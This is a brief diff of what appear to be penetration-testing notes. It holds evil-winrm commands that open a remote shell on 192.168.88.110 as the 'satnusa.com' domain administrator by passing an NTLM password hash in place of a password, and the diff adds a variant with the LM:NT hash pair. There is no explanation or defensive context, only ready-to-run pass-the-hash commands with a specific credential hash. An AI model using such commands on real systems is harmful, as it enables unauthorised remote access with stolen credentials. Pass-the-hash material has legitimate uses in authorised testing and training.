@@ -1,3 +1,4 @@
-
 evil-winrm -u satnusa.com\\administrator -H 70b87fe29b2777310897a77ba7fd5614 -i 192.168.88.110
 or 
+evil-winrm -u satnusa.com\\administrator -H aad3b435b51404eeaad3b435b51404ee:70b87fe29b2777310897a77ba7fd5614 -i 192.168.88.110
+
